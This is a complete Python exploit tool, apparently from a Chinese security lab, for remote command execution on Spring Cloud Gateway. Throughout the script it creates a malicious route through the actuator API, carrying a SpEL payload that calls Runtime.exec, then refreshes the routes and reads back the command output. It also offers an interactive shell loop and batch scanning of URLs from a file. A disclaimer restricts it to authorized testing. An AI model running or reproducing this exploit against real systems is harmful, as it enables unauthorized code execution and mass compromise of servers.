import sys
import requests
import random
import string
import json
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def Shell_exec(target,random_str,cmd):
    flag1 = Create_RCE_Router(target,random_str,cmd)
    if flag1:
        flag2 = Refresh_Router(target)
        if flag2:
            result = Get_RCE(target,random_str)
            if result is not None:
                print(result)

def Get_RCE(target,router_id):
    path = "/actuator/gateway/routes/" + router_id
    url = target + path
    url = url.replace("//actuator/", "/actuator/")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4472.114 Safari/537.36",
        "Content-Type": "application/json"
    }
    try:
        r = requests.get(url,headers=headers,verify=False,timeout=10)
        if r.status_code == 200:
            text = json.loads(r.text)
            pattern = r"'(.*)\n'"
            re_obj = re.compile(pattern)
            return re.findall(re_obj,text["filters"][0])[0]
        else:
            print("[-] %s 远程命令执行失败" % target)
    except Exception as e:
        print("[-] %s 请求目标网络异常" % target)

def Refresh_Router(target):
    path = "/actuator/gateway/refresh"
    url = target + path
    url = url.replace("//actuator/", "/actuator/")
    headers ={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4472.114 Safari/537.36",
        "Content-Type": "application/json"
    }
    try:
        r = requests.post(url,headers=headers,verify=False,timeout=10)
        if r.status_code == 200:
            return True
        else:
            print("[-] %s 重载路由失败" % target)
            return False
    except Exception as e:
        print("[-] %s 请求目标网络异常" % target)
        return False

def Create_RCE_Router(target,router_id,cmd):
    path = "/actuator/gateway/routes/" + router_id
    url = target + path
    url = url.replace("//actuator/", "/actuator/")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4472.114 Safari/537.36",
        "Content-Type": "application/json",
    }
    json_str = '''{\n"id": "%s",\n"filters": [{\n"name": "AddResponseHeader",\n"args": {"name": "Result",\n"value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"%s\\"}).getInputStream()))}"}\n}],\n"uri": "http://example.com"\n}''' % (router_id,cmd)

    try:
        r = requests.post(url,headers=headers,data=json_str,verify=False,timeout=10)
        if r.status_code == 201:
            return True
        else:
            print("[-] %s 攻击路由创建失败" % target)
            return False
    except Exception as e:
        print("[-] %s 请求目标网络异常" % target)
        return False

def Check_flag(target,random_str,cmd):
    flag1 = Create_RCE_Router(target,random_str,cmd)
    if flag1:
        flag2 = Refresh_Router(target)
        if flag2:
            result = Get_RCE(target,random_str)
            if result is not None:
                print("[+] %s 漏洞利用成功,命令执行结果为:%s" % (target,result))
                return True

def usage():
    print("")
    print("SpringCloudGatewayRCE / SpringCloudGateway远程命令执行")
    print("Code By:Jun_sheng @Github:https://github.com/jun-5heng/")
    print("橘子网络安全实验室 @https://0range.team/")
    print("")
    print("      _                            _                      ")
    print("     | |                          | |                     ")
    print("     | |_   _ _ __             ___| |__   ___ _ __   __ _ ")
    print(" _   | | | | |  _ \           / __|  _ \ / _ \  _ \ / _  |")
    print("| |__| | |_| | | | |  ______  \__ \ | | |  __/ | | | (_| |")
    print(" \____/ \__ _|_| |_| |______| |___/_| |_|\___|_| |_|\__  |")
    print("                                                     __/ |")
    print("                                                    |___/ ")
    print("")
    print("*************************警 告*****************************")
    print("本工具旨在帮助企业快速定位漏洞修复漏洞,仅限授权安全测试使用!")
    print("严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!")
    print("***********************************************************")
    print("")

def main():
    usage()
    random_str = ''.join(random.sample(string.ascii_letters + string.digits, 5))

    print("请输入序号进行选择：")
    print("1、单站点验证")
    print("2、批量站点验证")
    numb = input()
    cmd = input("请输入需要执行的命令:")
    if numb == "1":
        target = input("请输入url:")
        if Check_flag(target,random_str,cmd):
            print("")
            bash_shell = input("是否启用shell?(T/true)")
            if bash_shell in ("t","T","true","True",""):
                while True:
                    cmd = input("Jun_sheng:~# ")
                    if cmd in ("q", "quit", "e", "exit"):
                        sys.exit(0)
                    Shell_exec(target,random_str,cmd)
            else:
                sys.exit(0)
        else:
            sys.exit(0)
    elif numb == "2":
        print("请确认脚本当前路径下存在url.txt文件")
        with open("url.txt", "r", encoding="utf-8") as f:
            lines = f.readlines()
            for line in lines:
                target = line
                Check_flag(target, random_str, cmd)
    else:
        print("[*]请输入正确的选项！")

main()
